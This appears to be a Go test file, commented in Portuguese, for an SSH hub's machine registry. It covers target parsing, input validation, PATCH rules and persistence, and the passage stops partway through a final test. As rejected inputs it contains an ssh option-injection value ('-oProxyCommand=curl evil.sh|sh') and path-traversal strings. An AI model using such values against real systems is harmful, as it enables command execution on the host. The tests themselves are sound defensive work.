package machine

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

func TestParseSSHTargetsLeNomeEDestino(t *testing.T) {
	ms, warns := ParseSSHTargets("macbook=vx@192.0.2.20,macmini=remote-host")
	if len(warns) != 0 {
		t.Fatalf("avisos inesperados: %v", warns)
	}
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %d", len(ms))
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "vx@192.0.2.20" {
		t.Errorf("primeira máquina errada: %+v", ms[0])
	}
	if ms[0].Source != SourceEnv {
		t.Errorf("máquina do env deve ter Source=env, veio %q", ms[0].Source)
	}
	if ms[0].Port != 22 {
		t.Errorf("porta default deve ser 22, veio %d", ms[0].Port)
	}
}

func TestParseSSHTargetsAceitaTerceiroCampoComoRemoteCmd(t *testing.T) {
	ms, _ := ParseSSHTargets("macbook=vx@192.0.2.20=/Users/vx/.local/bin/claude")
	if len(ms) != 1 {
		t.Fatalf("esperava 1 máquina, veio %d", len(ms))
	}
	if ms[0].RemoteCmd != "/Users/vx/.local/bin/claude" {
		t.Errorf("remoteCmd errado: %q", ms[0].RemoteCmd)
	}
}

// Uma entrada ruim não pode derrubar as boas — o hub precisa subir mesmo com
// CUTUQUE_SSH_TARGETS meio torto.
func TestParseSSHTargetsIgnoraEntradaMalformadaSemPerderAsBoas(t *testing.T) {
	ms, warns := ParseSSHTargets("bom=vx@host, ,semigual,=sem-nome,vazio=")
	if len(ms) != 1 || ms[0].Name != "bom" {
		t.Fatalf("esperava só a entrada boa, veio %+v", ms)
	}
	if len(warns) != 3 {
		t.Errorf("esperava 3 avisos (semigual, =sem-nome, vazio=), veio %d: %v", len(warns), warns)
	}
}

// Defesa herdada do review da F5: um destino começando com "-" seria
// reinterpretado pelo ssh como opção (ex.: -oProxyCommand=curl evil.sh|sh). Injeção.
func TestParseSSHTargetsRejeitaDestinoQueParecOpcaoDoSSH(t *testing.T) {
	ms, warns := ParseSSHTargets("mal=-oProxyCommand=curl evil.sh|sh")
	if len(ms) != 0 {
		t.Errorf("destino começando com '-' deve ser recusado, veio %+v", ms)
	}
	if len(warns) != 1 {
		t.Errorf("esperava 1 aviso, veio %v", warns)
	}
}

// Formato amigável para copiar/colar no .env: espaço ao redor de nome e
// destino não pode quebrar o parse.
func TestParseSSHTargetsTiraEspacosAoRedor(t *testing.T) {
	ms, _ := ParseSSHTargets(" macbook = user@host , macmini = host2 ")
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %+v", ms)
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "user@host" {
		t.Errorf("primeira entrada não teve os espaços tirados: %+v", ms[0])
	}
	if ms[1].Name != "macmini" || ms[1].Dest != "host2" {
		t.Errorf("segunda entrada não teve os espaços tirados: %+v", ms[1])
	}
}

func TestParseSSHTargetsVazioNaoEhErro(t *testing.T) {
	ms, warns := ParseSSHTargets("   ")
	if len(ms) != 0 || len(warns) != 0 {
		t.Errorf("entrada vazia deve dar nada e nenhum aviso: %+v / %v", ms, warns)
	}
}

func TestRegistryGetEListPreservamAOrdemDoEnv(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "zulu", Dest: "a@b", Source: SourceEnv, Port: 22},
		{Name: "alfa", Dest: "c@d", Source: SourceEnv, Port: 22},
	})
	list := r.List()
	if len(list) != 2 || list[0].Name != "zulu" || list[1].Name != "alfa" {
		t.Errorf("List deve preservar a ordem do env, veio %+v", list)
	}
	m, ok := r.Get("alfa")
	if !ok || m.Dest != "c@d" {
		t.Errorf("Get(alfa) errado: %+v ok=%v", m, ok)
	}
	if _, ok := r.Get("naoexiste"); ok {
		t.Error("Get de máquina inexistente deve devolver ok=false")
	}
}

func TestNewRegistryPrimeiraOcorrenciaVence(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "dup", Dest: "primeiro", Port: 22, Source: SourceEnv},
		{Name: "dup", Dest: "segundo", Port: 22, Source: SourceEnv},
	})
	if len(r.List()) != 1 {
		t.Fatalf("nome repetido deve entrar uma vez só: %+v", r.List())
	}
	if m, _ := r.Get("dup"); m.Dest != "primeiro" {
		t.Errorf("a primeira ocorrência deve vencer, veio %q", m.Dest)
	}
}

// MARK: cadastro pelo app (F3) — depois do redesenho, o app manda Host+Identity,
// nunca Dest (que passou a ser derivado na leitura).

func TestAddCadastraMaquinaDoApp(t *testing.T) {
	r := NewRegistry(nil)
	m, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"})
	if err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	// Quem cadastra pelo app nunca escolhe a origem: é sempre app.
	if m.Source != SourceApp {
		t.Errorf("source = %q, esperava app", m.Source)
	}
	if got, ok := r.Get("vps"); !ok || got.Port != 2222 {
		t.Errorf("máquina não entrou no registro: %+v ok=%v", got, ok)
	}
}

// Porta 0 vira 22: o app pode mandar o campo vazio.
func TestAddSemPortaUsaAPadrao(t *testing.T) {
	r := NewRegistry(nil)
	m, _ := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
	if m.Port != defaultSSHPort {
		t.Errorf("porta = %d, esperava %d", m.Port, defaultSSHPort)
	}
}

// Porta acima do teto TCP é dado impossível, e sem esta recusa ela era guardada
// calada: a máquina só falhava depois, na conexão, com erro do ssh no lugar do
// erro do cadastro. 65535 é válida — o teto é inclusivo.
func TestAddRecusaPortaAcimaDoTeto(t *testing.T) {
	for _, porta := range []int{maxPort + 1, 70000, 999999} {
		r := NewRegistry(nil)
		_, err := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: porta})
		if !errors.Is(err, ErrInvalidDest) {
			t.Errorf("porta %d: err = %v, quero ErrInvalidDest", porta, err)
		}
		if _, ok := r.Get("vps"); ok {
			t.Errorf("porta %d: a máquina entrou no registro mesmo recusada", porta)
		}
	}
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: maxPort}); err != nil {
		t.Errorf("porta %d devia passar: %v", maxPort, err)
	}
}

// Recusar não é o suficiente: o PATCH que falha não pode deixar a máquina pela
// metade (é o mesmo mapa em memória que o resto do hub lê).
func TestUpdateRecusaPortaAcimaDoTetoESeguraOCadastro(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx", Port: 2222})

	if _, err := r.Update("vps", Machine{Host: "novo", Port: 70000}); !errors.Is(err, ErrInvalidDest) {
		t.Fatalf("err = %v, quero ErrInvalidDest", err)
	}
	m, ok := r.Get("vps")
	if !ok {
		t.Fatal("a máquina sumiu por causa de um patch recusado")
	}
	if m.Host != "antigo" || m.Port != 2222 {
		t.Errorf("patch recusado mexeu no cadastro: host=%q porta=%d", m.Host, m.Port)
	}
}

func TestAddRecusaNomeRepetido(t *testing.T) {
	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
	if _, err := r.Add(Machine{Name: "macbook", Host: "outro", Identity: "vx"}); !errors.Is(err, ErrDuplicateName) {
		t.Errorf("err = %v, quero ErrDuplicateName", err)
	}
	if m, _ := r.Get("macbook"); m.Dest != "vx@host" {
		t.Errorf("o cadastro duplicado sobrescreveu a máquina do env: %+v", m)
	}
}

// O nome vai na URL e vira caminho de arquivo de chave. Barra, "..", espaço e
// vazio não podem passar: seriam path traversal ou rota quebrada.
func TestAddRecusaNomeInvalido(t *testing.T) {
	for _, nome := range []string{"", "  ", "a/b", "..", "../fuga", "com espaço", "a\tb"} {
		r := NewRegistry(nil)
		if _, err := r.Add(Machine{Name: nome, Host: "host", Identity: "vx"}); err == nil {
			t.Errorf("nome %q devia ser recusado", nome)
		}
	}
}

// Mesma defesa do ParseSSHTargets: host com "-" na frente vira opção do ssh.
func TestAddRecusaHostQueParecOpcao(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Host: "-oProxyCommand=curl evil.sh|sh", Identity: "vx"}); err == nil {
		t.Error("host começando com '-' devia ser recusado")
	}
}

func TestAddRecusaHostVazio(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Host: "   ", Identity: "vx"}); err == nil {
		t.Error("host vazio devia ser recusado")
	}
}

// Depois do redesenho o usuário mora na identidade: um host com "user@" grudado
// é o formato antigo, e aceitá-lo deixaria o app contornar a identidade.
func TestAddRecusaHostComArroba(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Host: "vx@host", Identity: "vx"}); !errors.Is(err, ErrInvalidDest) {
		t.Errorf("host com usuário grudado devia ser recusado, veio err=%v", err)
	}
}

// A identidade segue a mesma regra de nome do KeyStore (vira segmento de rota e
// nome de arquivo de chave): vazia ou com caracteres fora do padrão é recusada.
func TestAddRecusaIdentidadeInvalida(t *testing.T) {
	for _, identidade := range []string{"", "com espaço", "../fuga"} {
		r := NewRegistry(nil)
		if _, err := r.Add(Machine{Name: "vps", Host: "host", Identity: identidade}); !errors.Is(err, ErrInvalidDest) {
			t.Errorf("identidade %q devia ser recusada, veio err=%v", identidade, err)
		}
	}
}

func TestUpdateAlteraHostEPorta(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx", Port: 22})
	m, err := r.Update("vps", Machine{Host: "novo", Port: 2222})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Host != "novo" || m.Port != 2222 {
		t.Errorf("update não pegou: %+v", m)
	}
}

// A chave e o fingerprint são do hub, não do app: um PATCH não pode trocá-los
// (seria aceitar outro host se passando pelo cadastrado).
func TestUpdateNaoDeixaTrocarChaveNemFingerprint(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")
	_ = r.SetFingerprint("vps", "SHA256:original")

	_, err := r.Update("vps", Machine{
		Host: "host", KeyPath: "/etc/passwd", HostFingerprint: "SHA256:doAtacante",
	})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	m, _ := r.Get("vps")
	if m.KeyPath != "/data/machines/keys/vps" || m.HostFingerprint != "SHA256:original" {
		t.Errorf("chave/fingerprint foram trocados pelo PATCH: %+v", m)
	}
}

// O fingerprint pertence a um (host, porta): apontar a máquina para outro host
// invalida a confirmação anterior. Mantê-lo faria o hub achar que já confiou
// num host que a usuária nunca conferiu. A mesma troca também limpa o SO
// detectado — ele foi lido daquele par (host, conta), e outro host pode
// responder outra coisa.
func TestUpdateLimpaOFingerprintEOSOQuandoOHostMuda(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx", Port: 22})
	_ = r.SetFingerprint("vps", "SHA256:doAntigo")
	_ = r.SetOS("vps", "Darwin 24.5.0")

	m, err := r.Update("vps", Machine{Host: "outro", Port: 22})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.HostFingerprint != "" {
		t.Errorf("fingerprint do host antigo sobreviveu à troca de host: %q", m.HostFingerprint)
	}
	if m.OS != "" {
		t.Errorf("SO detectado sobreviveu à troca de host: %q", m.OS)
	}
}

// Porta diferente pode ser outro serviço (ou outro container) na mesma máquina:
// também exige reconfirmar, e também derruba o SO detectado pela mesma razão.
func TestUpdateLimpaOFingerprintEOSOQuandoAPortaMuda(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: 22})
	_ = r.SetFingerprint("vps", "SHA256:na22")
	_ = r.SetOS("vps", "Darwin 24.5.0")

	m, _ := r.Update("vps", Machine{Host: "host", Port: 2222})
	if m.HostFingerprint != "" {
		t.Errorf("fingerprint sobreviveu à troca de porta: %q", m.HostFingerprint)
	}
	if m.OS != "" {
		t.Errorf("SO detectado sobreviveu à troca de porta: %q", m.OS)
	}
}

// A regra nova do redesenho: quem entra na máquina é assunto separado de qual
// host ela é. Trocar SÓ a identidade (host e porta iguais) não derruba nem o
// fingerprint nem o SO — os dois são propriedades do (host, porta), não da
// conta que loga nele.
func TestUpdateTrocaDeIdentidadeNaoDerrubaFingerprintNemOS(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: 22})
	_ = r.SetFingerprint("vps", "SHA256:doHost")
	_ = r.SetOS("vps", "Darwin 24.5.0")

	m, err := r.Update("vps", Machine{Identity: "outra-identidade"})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Identity != "outra-identidade" {
		t.Errorf("a identidade não trocou: %+v", m)
	}
	if m.HostFingerprint != "SHA256:doHost" {
		t.Errorf("trocar de identidade derrubou o fingerprint do host: %q", m.HostFingerprint)
	}
	if m.OS != "Darwin 24.5.0" {
		t.Errorf("trocar de identidade limpou o SO detectado: %q", m.OS)
	}
}

// A chave privada continua servindo o mesmo cadastro mesmo mudando o host —
// só o fingerprint (e o SO) caem. Regerar a chave obrigaria a reinstalar no
// destino sem necessidade.
func TestUpdateNaoApagaAChaveAoMudarOHost(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx"})
	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")

	m, _ := r.Update("vps", Machine{Host: "outro"})
	if m.KeyPath != "/data/machines/keys/vps" {
		t.Errorf("a chave foi perdida na troca de host: %q", m.KeyPath)
	}
}

// PATCH, não PUT: campo omitido (zero value) mantém o valor atual. É o que
// permite ao app mandar só o que mudou.
func TestUpdateCampoOmitidoMantemOAtual(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host-antigo", Identity: "vx", Port: 22})
	_ = r.SetTheme("vps", "dracula")

	// Só a identidade muda: host, porta e tema ficam como estavam.
	m, err := r.Update("vps", Machine{Identity: "outra-identidade"})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Host != "host-antigo" || m.Port != 22 || m.Identity != "outra-identidade" || m.Theme != "dracula" {
		t.Errorf("patch parcial não manteve os campos omitidos: %+v", m)
	}

	// Só o host muda: identidade, porta e tema ficam.
	m, err = r.Update("vps", Machine{Host: "host-novo"})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Host != "host-novo" || m.Port != 22 || m.Identity != "outra-identidade" || m.Theme != "dracula" {
		t.Errorf("patch parcial não manteve identidade/porta/tema: %+v", m)
	}

	// Tema pode ser trocado sozinho, sem mexer no resto.
	m, err = r.Update("vps", Machine{Theme: "solarized"})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Theme != "solarized" || m.Host != "host-novo" {
		t.Errorf("troca de tema isolada não pegou: %+v", m)
	}
}

// Máquina do hub.env é read-only pelo app: quem manda nela é o env.
func TestUpdateERemoveRecusamMaquinaDoEnv(t *testing.T) {
	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
	if _, err := r.Update("macbook", Machine{Host: "outro", Identity: "vx"}); !errors.Is(err, ErrReadOnly) {
		t.Errorf("Update: err = %v, quero ErrReadOnly", err)
	}
	if err := r.Remove("macbook"); !errors.Is(err, ErrReadOnly) {
		t.Errorf("Remove: err = %v, quero ErrReadOnly", err)
	}
	if _, ok := r.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu do registro")
	}
}

func TestUpdateERemoveDeMaquinaInexistente(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Update("fantasma", Machine{Host: "y", Identity: "x"}); !errors.Is(err, ErrNotFound) {
		t.Errorf("Update: err = %v, quero ErrNotFound", err)
	}
	if err := r.Remove("fantasma"); !errors.Is(err, ErrNotFound) {
		t.Errorf("Remove: err = %v, quero ErrNotFound", err)
	}
}

func TestRemoveTiraDaListaEDaOrdem(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "a", Host: "a", Identity: "vx"})
	_, _ = r.Add(Machine{Name: "b", Host: "b", Identity: "vx"})
	if err := r.Remove("a"); err != nil {
		t.Fatalf("Remove falhou: %v", err)
	}
	list := r.List()
	if len(list) != 1 || list[0].Name != "b" {
		t.Errorf("lista após remoção errada: %+v", list)
	}
}

// MARK: SetOS / SetTheme / UsesIdentity

func TestSetOSESetTheme(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})

	if err := r.SetOS("vps", "Darwin 24.5.0"); err != nil {
		t.Fatalf("SetOS falhou: %v", err)
	}
	if err := r.SetTheme("vps", "dracula"); err != nil {
		t.Fatalf("SetTheme falhou: %v", err)
	}
	m, _ := r.Get("vps")
	if m.OS != "Darwin 24.5.0" || m.Theme != "dracula" {
		t.Errorf("SetOS/SetTheme não gravaram: %+v", m)
	}

	if err := r.SetOS("fantasma", "x"); !errors.Is(err, ErrNotFound) {
		t.Errorf("SetOS de máquina inexistente: err = %v, quero ErrNotFound", err)
	}
	if err := r.SetTheme("fantasma", "x"); !errors.Is(err, ErrNotFound) {
		t.Errorf("SetTheme de máquina inexistente: err = %v, quero ErrNotFound", err)
	}
}

// MARK: SetAppearance

// A razão de existir do SetAppearance: vazio aqui é uma ESCOLHA (tema Padrão,
// ícone automático), não uma omissão. Pelo Update isso era impossível — vazio
// significa "mantém" —, então não havia como voltar ao tema Padrão.
func TestSetAppearanceVoltaAoPadrao(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})

	m, err := r.SetAppearance("vps", "dracula", "apple")
	if err != nil {
		t.Fatalf("SetAppearance falhou: %v", err)
	}
	if m.Theme != "dracula" || m.Icon != "apple" {
		t.Errorf("aparência não gravou: %+v", m)
	}

	m, err = r.SetAppearance("vps", "", "")
	if err != nil {
		t.Fatalf("SetAppearance de volta ao padrão falhou: %v", err)
	}
	if m.Theme != "" || m.Icon != "" {
		t.Errorf("vazio não apagou a escolha: %+v", m)
	}
	if guardada, _ := r.Get("vps"); guardada.Theme != "" || guardada.Icon != "" {
		t.Errorf("o registro seguiu com a escolha antiga: %+v", guardada)
	}
}

// Aparência não afeta conexão: a rota que a muda não pode ter como derrubar uma
// confiança que a usuária conferiu à mão, nem o SO detectado (que é fato, e é o
// que faz o ícone automático funcionar quando ela volta atrás).
func TestSetAppearanceNaoEncostaEmConexaoNemNoSO(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: 2222})
	_ = r.SetFingerprint("vps", "SHA256:abc")
	_ = r.SetOS("vps", "Darwin 24.5.0")
	_ = r.SetKeyPath("vps", "/data/machines/keys/vx")

	m, err := r.SetAppearance("vps", "nord", "pc")
	if err != nil {
		t.Fatalf("SetAppearance falhou: %v", err)
	}
	if m.HostFingerprint != "SHA256:abc" || m.OS != "Darwin 24.5.0" {
		t.Errorf("aparência mexeu em fingerprint ou SO: %+v", m)
	}
	if m.Host != "host" || m.Port != 2222 || m.Identity != "vx" || m.KeyPath != "/data/machines/keys/vx" {
		t.Errorf("aparência mexeu em host/porta/identidade/chave: %+v", m)
	}
}

// O ícone manual sobrevive a um PATCH: sem o `next.Icon = cur.Icon` no Update,
// trocar o host apagaria a escolha em silêncio. O SO, ao contrário, cai de
// propósito — ele é do par (host, conta).
func TestUpdateNaoApagaOIconeEscolhido(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx"})
	_, _ = r.SetAppearance("vps", "gruvboxDark", "apple")
	_ = r.SetOS("vps", "Darwin 24.5.0")

	m, err := r.Update("vps", Machine{Host: "novo"})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Icon != "apple" || m.Theme != "gruvboxDark" {
		t.Errorf("o PATCH apagou a aparência escolhida: %+v", m)
	}
	if m.OS != "" {
		t.Errorf("o SO detectado sobreviveu à troca de host: %q", m.OS)
	}
}

// O hub valida a FORMA, não a lista: quem conhece temas e ícones é o app. O que
// não pode é entrar lixo de tamanho arbitrário no registro.
func TestSetAppearanceRecusaIDMalformado(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
	_, _ = r.SetAppearance("vps", "nord", "apple")

	ruins := []struct{ theme, icon string }{
		{"../../etc/passwd", ""},
		{"tema com espaço", ""},
		{strings.Repeat("a", 33), ""},
		{"", "-flag"},
		{"", "ícone"},
	}
	for _, ruim := range ruins {
		if _, err := r.SetAppearance("vps", ruim.theme, ruim.icon); !errors.Is(err, ErrInvalidLook) {
			t.Errorf("SetAppearance(%q, %q): err = %v, quero ErrInvalidLook", ruim.theme, ruim.icon, err)
		}
	}
	// Nenhuma das recusas pode ter deixado rastro.
	if m, _ := r.Get("vps"); m.Theme != "nord" || m.Icon != "apple" {
		t.Errorf("uma recusa mexeu na aparência guardada: %+v", m)
	}
}

func TestSetAppearanceRecusaEnvEInexistente(t *testing.T) {
	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
	if _, err := r.SetAppearance("macbook", "nord", ""); !errors.Is(err, ErrReadOnly) {
		t.Errorf("máquina do env: err = %v, quero ErrReadOnly", err)
	}
	if _, err := r.SetAppearance("fantasma", "nord", ""); !errors.Is(err, ErrNotFound) {
		t.Errorf("máquina inexistente: err = %v, quero ErrNotFound", err)
	}
}

// UsesIdentity é o que impede o DELETE /identities de apagar uma identidade
// ainda referenciada por alguma máquina.
func TestUsesIdentity(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})

	if !r.UsesIdentity("vx") {
		t.Error("UsesIdentity devia achar a identidade em uso")
	}
	if r.UsesIdentity("ninguem-usa") {
		t.Error("UsesIdentity não devia achar identidade que ninguém usa")
	}
}

// MARK: derivação do Dest e do KeyPath a partir da identidade

// O coração do redesenho: para máquina do app, quem manda no Dest e no KeyPath
// é a identidade, resolvida no Get/List — nunca gravada.
func TestGetEListDerivamODestEOKeyPathDaIdentidade(t *testing.T) {
	idents := NewIdentityStore()
	if _, err := idents.Add(Identity{Name: "vx", Username: "vanessa"}, ""); err != nil {
		t.Fatalf("identidade: %v", err)
	}
	if err := idents.SetKeyPath("vx", "/data/machines/keys/vx"); err != nil {
		t.Fatalf("SetKeyPath: %v", err)
	}
	r := NewRegistry(nil)
	r.UseIdentities(idents)
	if _, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"}); err != nil {
		t.Fatalf("Add: %v", err)
	}

	m, ok := r.Get("vps")
	if !ok {
		t.Fatal("máquina não encontrada")
	}
	if m.Dest != "vanessa@203.0.113.9" {
		t.Errorf("Dest não foi derivado da identidade: %q", m.Dest)
	}
	if m.KeyPath != "/data/machines/keys/vx" {
		t.Errorf("KeyPath não foi resolvido da identidade: %q", m.KeyPath)
	}

	lista := r.List()
	if len(lista) != 1 || lista[0].Dest != "vanessa@203.0.113.9" || lista[0].KeyPath != "/data/machines/keys/vx" {
		t.Errorf("List não derivou Dest/KeyPath: %+v", lista)
	}
}

// Identidade referenciada que não existe mais (ex.: apagada por fora da regra
// UsesIdentity, ou dado inconsistente) não pode derrubar o Get: a máquina
// simplesmente fica sem Dest resolvido, em vez de o hub quebrar.
func TestGetNaoQuebraQuandoAIdentidadeReferenciadaSumiu(t *testing.T) {
	r := NewRegistry(nil)
	r.UseIdentities(NewIdentityStore()) // store presente, mas sem a identidade "vx"
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})

	m, ok := r.Get("vps")
	if !ok {
		t.Fatal("máquina não encontrada")
	}
	if m.Dest != "" {
		t.Errorf("Dest não devia resolver com identidade inexistente: %q", m.Dest)
	}
}

// MARK: persistência

func TestRegistroSobreviveAoRestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")

	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, NewIdentityStore())
	if _, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	_ = r.SetFingerprint("vps", "SHA256:abc")

	// Restart: mesmo arquivo, mesmas máquinas do env.
	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, NewIdentityStore())
	m, ok := r2.Get("vps")
	if !ok {
		t.Fatal("a máquina cadastrada sumiu no restart")
	}
	if m.Port != 2222 || m.HostFingerprint != "SHA256:abc" || m.Source != SourceApp {
		t.Errorf("máquina voltou diferente: %+v", m)
	}
	if _, ok := r2.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu depois de carregar o disco")
	}
}

// Aparência é escolha da usuária, não estado de execução: tem de sobreviver ao
// restart. Sem o campo no diskMachine ela voltaria ao padrão a cada deploy — e o
// sintoma (o tema "sumiu sozinho") apareceria longe da causa.
// Dois aparelhos dela mexendo na aparência da MESMA máquina ao mesmo tempo (o
// iPad e o iPhone com a sheet aberta). A semântica é "a última escrita ganha", e
// para cor de terminal isso é aceitável — o que não é aceitável é o /data
// divergir do que ficou em memória, ou sair JSON pela metade: o próximo boot
// leria uma aparência que ninguém escolheu, ou perderia o cadastro inteiro.
//
// Falha sem o `saveMu` do persist: o snapshot é tirado fora do lock e todas as
// gravações disputam o mesmo `.tmp`.
func TestSetAppearanceConcorrenteNaoDivergeDoDisco(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	r := NewRegistryAt(path, nil, NewIdentityStore())
	for _, n := range []string{"vps", "macmini", "casa"} {
		if _, err := r.Add(Machine{Name: n, Host: "203.0.113.9", Identity: "vx"}); err != nil {
			t.Fatalf("Add(%q) falhou: %v", n, err)
		}
	}

	// Tamanhos de serialização bem diferentes de propósito: é a diferença de
	// bytes que faz uma escrita atropelada aparecer como JSON truncado.
	escolhas := []struct{ tema, icone string }{
		{"catppuccinMochaComNomeLongo", "raspberrypi"},
		{"", ""},
		{"nord", "cloud"},
	}
	var wg sync.WaitGroup
	for i := 0; i < 60; i++ {
		e := escolhas[i%len(escolhas)]
		wg.Add(1)
		go func() {
			defer wg.Done()
			if _, err := r.SetAppearance("vps", e.tema, e.icone); err != nil {
				t.Errorf("SetAppearance concorrente falhou: %v", err)
			}
		}()
	}
	wg.Wait()

	memoria, ok := r.Get("vps")
	if !ok {
		t.Fatal("a máquina sumiu")
	}
	combinacaoPedida := false
	for _, e := range escolhas {
		if memoria.Theme == e.tema && memoria.Icon == e.icone {
			combinacaoPedida = true
		}
	}
	if !combinacaoPedida {
		t.Errorf("sobrou combinação que ninguém pediu: tema=%q ícone=%q", memoria.Theme, memoria.Icon)
	}

	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("não deu para ler o arquivo: %v", err)
	}
	var disco []diskMachine
	if err := json.Unmarshal(b, &disco); err != nil {
		t.Fatalf("JSON inválido em disco (escrita atropelada): %v\nconteúdo: %s", err, b)
	}
	if len(disco) != 3 {
		t.Fatalf("o arquivo tem %d máquinas, esperava 3: %s", len(disco), b)
	}
	for _, d := range disco {
		if d.Name != "vps" {
			continue
		}
		if d.Theme != memoria.Theme || d.Icon != memoria.Icon {
			t.Errorf("disco divergiu da memória: disco tema=%q ícone=%q, memória tema=%q ícone=%q",
				d.Theme, d.Icon, memoria.Theme, memoria.Icon)
		}
	}
}

func TestAparenciaSobreviveAoRestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")

	r := NewRegistryAt(path, nil, NewIdentityStore())
	if _, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Identity: "vx"}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	if _, err := r.SetAppearance("vps", "catppuccinMocha", "server"); err != nil {
		t.Fatalf("SetAppearance falhou: %v", err)
	}

	m, ok := NewRegistryAt(path, nil, NewIdentityStore()).Get("vps")
	if !ok {
		t.Fatal("a máquina sumiu no restart")
	}
	if m.Theme != "catppuccinMocha" || m.Icon != "server" {
		t.Errorf("aparência não sobreviveu: tema=%q ícone=%q", m.Theme, m.Icon)
	}
}

// O env é a fonte da verdade das suas máquinas: se o disco tem uma antiga com o
// mesmo nome, o env vence — senão dava para "sequestrar" um nome do env
// cadastrando antes de ele existir.
func TestEnvVenceODiscoNoMesmoNome(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	r := NewRegistryAt(path, nil, nil)
	if _, err := r.Add(Machine{Name: "macbook", Host: "doAtacante", Identity: "vx"}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}

	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@doEnv", Port: 22, Source: SourceEnv}}, nil)
	m, _ := r2.Get("macbook")
	if m.Dest != "vx@doEnv" || m.Source != SourceEnv {
		t.Errorf("o disco sobrescreveu o env: %+v", m)
	}
}

// Remoção também tem que persistir: senão a máquina volta no restart.
func TestRemocaoPersiste(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	r := NewRegistryAt(path, nil, nil)
	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
	if err := r.Remove("vps"); err != nil {
		t.Fatalf("Remove falhou: %v", err)
	}
	if _, ok := NewRegistryAt(path, nil, nil).Get("vps"); ok {
		t.Error("a máquina removida voltou no restart")
	}
}

// Arquivo corrompido não pode derrubar o boot: o hub sobe com o que o env deu.
func TestDiscoCorrompidoNaoDerrubaOBoot(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
